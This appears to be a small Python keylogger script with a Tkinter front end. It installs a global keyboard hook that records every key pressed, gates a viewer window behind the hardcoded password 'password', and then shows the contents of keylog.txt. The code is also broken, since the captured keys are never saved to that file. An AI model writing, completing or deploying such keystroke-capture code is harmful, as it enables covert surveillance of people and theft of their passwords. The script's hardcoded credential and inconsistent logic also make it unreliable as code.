import tkinter as tk
from tkinter import messagebox
import keyboard
import os

correct_password = "password"
keylogger_output = ""

def on_key_event(event):
    global keylogger_output
    key_name = event.name
    if event.event_type == "down":
        keylogger_output += event.name

def check_login():
    password = entry_password.get()
    if password == correct_password:
        login_root.destroy()
        display_keylogger_output()
    else:
        messagebox.showerror("Login Failed", "Invalid password")

def display_keylogger_output():
    global keylogger_output
    try:
        with open("keylog.txt", "r") as f:
            keylogger_output = f.read()
    except FileNotFoundError:
        keylogger_output = "Keylog file not found."

    new_window = tk.Tk()
    new_window.title("Keylogger Output")
    new_window.geometry("400x300")

    text_widget = tk.Text(new_window, bg='black', fg='white')
    text_widget.pack(expand=True, fill='both')

    text_widget.insert('1.0', keylogger_output)

    new_window.mainloop()

login_root = tk.Tk()
login_root.title("Login Page")
login_root.geometry("300x150")
login_root.resizable(False, False)

label_password = tk.Label(login_root, text="Password:")
label_password.pack(pady=(20, 5))
entry_password = tk.Entry(login_root, show="*")
entry_password.pack(pady=5)

login_button = tk.Button(login_root, text="Login", command=check_login,bg="light green",fg="white")
login_button.pack(pady=(10, 20))

keyboard.on_press(on_key_event)

login_root.mainloop()
